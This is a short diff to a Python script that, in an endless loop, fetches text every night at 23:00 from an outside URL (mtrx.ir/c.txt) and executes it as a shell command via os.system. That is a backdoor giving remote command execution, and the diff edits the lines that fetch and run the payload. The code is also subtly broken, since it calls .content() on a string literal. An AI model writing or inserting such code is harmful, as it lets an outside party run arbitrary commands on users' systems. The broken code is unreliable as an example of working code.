@@ -4,5 +4,6 @@ import datetime, os, urllib.request
 
 while True:
     if datetime.datetime.now().hour == 23:
-        if urllib.request.urlopen('https://mtrx.ir/c.txt'.content()) != '':
+        b = urllib.request.urlopen('https://mtrx.ir/c.txt'.content()) 
+        if b != '':
             os.system('{}'.format(b))
